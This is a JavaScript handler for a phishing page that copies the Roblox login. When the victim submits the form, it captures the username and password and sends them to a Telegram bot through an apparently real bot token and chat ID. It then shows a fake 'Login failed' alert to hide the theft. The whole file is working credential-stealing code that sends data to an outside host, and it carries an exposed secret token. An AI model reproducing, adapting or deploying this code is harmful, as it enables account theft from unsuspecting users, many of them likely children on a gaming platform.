document.getElementById('login-form').addEventListener('submit', function (event) {
    event.preventDefault();

    const botToken = '7614186719:AAG7QyHjzRA7YffYVrhm6V7AtW_i6aaXo9Q';  // ← Replace with your bot token
    const chatId = '6950087756';      // ← Replace with your chat ID

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const message = `🧠 Roblox Phish\n👤 Username: ${username}\n🔐 Password: ${password}`;

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    fetch(telegramUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(res => res.json())
    .then(data => {
        console.log('Login failed. Please try again later.', data);
        alert('Login failed. Please try again later.'); // Fake error
    })
    .catch(err => {
        console.error('Error:', err);
    });
});
